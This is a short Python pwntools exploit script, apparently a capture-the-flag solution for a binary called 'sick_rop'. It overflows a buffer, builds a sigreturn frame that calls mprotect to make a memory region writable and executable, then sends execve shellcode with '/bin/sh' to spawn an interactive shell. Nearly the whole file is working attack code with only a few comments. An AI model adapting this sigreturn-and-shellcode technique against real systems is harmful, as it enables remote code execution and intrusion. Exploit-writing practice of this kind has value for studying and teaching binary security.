#!/usr/bin/env python3

from pwn import *
import time

exe = ELF("./sick_rop")

context.binary = exe
SYSCALL_RET = p64(0x00401014)
VULN = p64(0x000000000040102e)
WHERE_WE_WRITE_AFTER_MPROT = p64(0x4010b8)

WRITE_ADDR = 0x400000

def conn():
    if args.LOCAL or args.DEBUG:
        r = process([exe.path])
        gdb.attach(r)
    else:
        r = remote("x", 1)

    return r

def get_mprot_frame():
    f = SigreturnFrame()
    f.rax = 0x0a
    f.rdi = 0x400000
    f.rsi = 0x2000
    f.rdx = 0x1 | 0x2 | 0x4
    f.rip = u64(SYSCALL_RET)
    f.rsp = 0x4010d8
    return bytes(f)

def main():
    r = conn()

    mprot_payload = b"A" * 40
    mprot_payload += VULN
    mprot_payload += SYSCALL_RET
    mprot_payload += get_mprot_frame()

    f = open("./execve_shellcode_mprotect", 'rb');
    shellcode = b"\x90\x90\x90\x90"; # Some NOP chain
    shellcode += f.read(); # execve, with binsh at 0x4010f0
    shellcode += b"A" * (40 - len(shellcode)) # ret instruction on the "stack"
    shellcode += WHERE_WE_WRITE_AFTER_MPROT
    shellcode += b"A" * (0x4010f0 - u64(WHERE_WE_WRITE_AFTER_MPROT) - len(shellcode))
    shellcode += b"/bin/sh\x00"

    r.send(mprot_payload)
    r.recv(len(mprot_payload))
    r.send(b"A" * 15)
    r.recv(15)
    r.send(shellcode)

    # We should have shell, program will likely crash afterwards
    r.interactive()


if __name__ == "__main__":
    main()

